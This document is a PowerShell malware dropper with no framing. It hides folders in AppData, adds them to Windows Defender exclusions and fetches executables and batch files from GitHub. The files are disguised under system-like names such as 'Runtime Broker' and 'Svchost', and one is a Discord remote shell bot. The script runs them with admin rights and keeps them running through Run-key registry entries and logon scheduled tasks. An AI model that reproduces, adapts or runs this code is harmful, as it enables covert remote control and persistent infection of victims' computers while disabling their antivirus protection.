#Requires -RunAsAdministrator

# Dynamic path setup for current user
$userProfile = [Environment]::GetFolderPath('UserProfile')
$appDataRoaming = [Environment]::GetFolderPath('ApplicationData')
$hiddenBaseDir = "$appDataRoaming\SubDir"
$runtimeBrokerDir = "$appDataRoaming\Runtime Broker"

# Create hidden directories
$directories = @($hiddenBaseDir, $runtimeBrokerDir)
foreach ($dir in $directories) {
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
        attrib +h +s "$dir"  # Hide and add system attribute
        Write-Host "Created hidden directory: $dir"
    } else {
        Write-Host "Directory already exists: $dir"
    }
}

# Add both paths to Windows Defender exclusions
$exclusionPaths = @($hiddenBaseDir, $runtimeBrokerDir)
foreach ($path in $exclusionPaths) {
    try {
        Add-MpPreference -ExclusionPath $path -ErrorAction Stop
        Write-Host "Successfully added to Defender exclusions: $path"
    } catch {
        Write-Warning "Failed to add exclusion for $path : $_"
    }
}

# Define files to download
$filesToDownload = @(
    @{
        Name = "Runtime Broker"
        Url = "https://github.com/salamprajjit-alt/0412414124412445235235123313412312/raw/main/Runtime%20Broker.exe"
        Path = "$hiddenBaseDir\Runtime Broker.exe"
        Priority = 1
    },
    @{
        Name = "Svchost"
        Url = "https://github.com/salamprajjit-alt/0412414124412445235235123313412312/raw/main/Svchost.bat"
        Path = "$hiddenBaseDir\Svchost.bat"
        Priority = 1
    },
    @{
        Name = "Microsoft"
        Url = "https://github.com/salamprajjit-alt/0412414124412445235235123313412312/raw/main/Microsoft.bat"
        Path = "$hiddenBaseDir\Microsoft.bat"
        Priority = 1
    },
    @{
        Name = "DisR"
        Url = "https://github.com/salamprajjit-alt/0412414124412445235235123313412312/raw/main/DisR.exe"
        Path = "$hiddenBaseDir\DisR.exe"
        Priority = 2
    },
    @{
        Name = "DiscordRemoteShellBot"
        Url = "https://github.com/salamprajjit-alt/5132525231/raw/main/DiscordRemoteShellBot.exe"
        Path = "$hiddenBaseDir\DiscordRemoteShellBot.exe"
        Priority = 2
    }
)

# Download and execute files
foreach ($file in $filesToDownload) {
    try {
        # Download the file
        Write-Host "Downloading $($file.Name)..."
        Invoke-WebRequest -Uri $file.Url -OutFile $file.Path -ErrorAction Stop
        Write-Host "Download completed: $($file.Path)"
        
        # Verify file exists before execution
        if (Test-Path $file.Path) {
            # Execute with admin privileges
            if ($file.Path -like "*.bat") {
                # For batch files, use cmd.exe to execute with admin privileges
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$($file.Path)`"" -Verb RunAs -ErrorAction Stop
            } else {
                # For executables, use the standard method
                Start-Process -FilePath "`"$($file.Path)`"" -Verb RunAs -ErrorAction Stop
            }
            Write-Host "Execution started with admin privileges: $($file.Name)"
            
            # Add to startup via Registry (Current User) for priority 1 files
            if ($file.Priority -eq 1) {
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                if ($file.Path -like "*.bat") {
                    # For batch files, set the value to run with cmd.exe
                    Set-ItemProperty -Path $regPath -Name $file.Name -Value "cmd.exe /c `"$($file.Path)`"" -ErrorAction Stop
                } else {
                    Set-ItemProperty -Path $regPath -Name $file.Name -Value "`"$($file.Path)`"" -ErrorAction Stop
                }
                Write-Host "Added to startup via Registry: $($file.Name)"
            }
        } else {
            Write-Warning "Downloaded file not found at: $($file.Path)"
        }
    } catch {
        Write-Warning "Error during download/execution of $($file.Name): $_"
        # If this is a priority 1 file, try again
        if ($file.Priority -eq 1) {
            Write-Host "Retrying $($file.Name) download..."
            try {
                # Alternative download method
                $webClient = New-Object System.Net.WebClient
                $webClient.DownloadFile($file.Url, $file.Path)
                if (Test-Path $file.Path) {
                    if ($file.Path -like "*.bat") {
                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$($file.Path)`"" -Verb RunAs
                    } else {
                        Start-Process -FilePath "`"$($file.Path)`"" -Verb RunAs
                    }
                    Write-Host "$($file.Name) execution started after retry"
                    
                    # Add to registry after retry
                    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                    if ($file.Path -like "*.bat") {
                        Set-ItemProperty -Path $regPath -Name $file.Name -Value "cmd.exe /c `"$($file.Path)`""
                    } else {
                        Set-ItemProperty -Path $regPath -Name $file.Name -Value "`"$($file.Path)`""
                    }
                }
            } catch {
                Write-Error "Failed to download $($file.Name) after retry: $_"
            }
        }
    }
}

# Additional startup persistence via Task Scheduler for all successfully downloaded files
foreach ($file in $filesToDownload) {
    if (Test-Path $file.Path) {
        try {
            if ($file.Path -like "*.bat") {
                # For batch files, set the action to run with cmd.exe
                $taskAction = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$($file.Path)`""
            } else {
                $taskAction = New-ScheduledTaskAction -Execute $file.Path
            }
            $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
            $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
            Register-ScheduledTask -TaskName $file.Name -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force -ErrorAction Stop
            Write-Host "Added to startup via Task Scheduler: $($file.Name)"
        } catch {
            Write-Warning "Failed to add $($file.Name) to Task Scheduler: $_"
        }
    }
}

# Verify exclusions (optional)
Write-Host "Current Defender Exclusions:"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath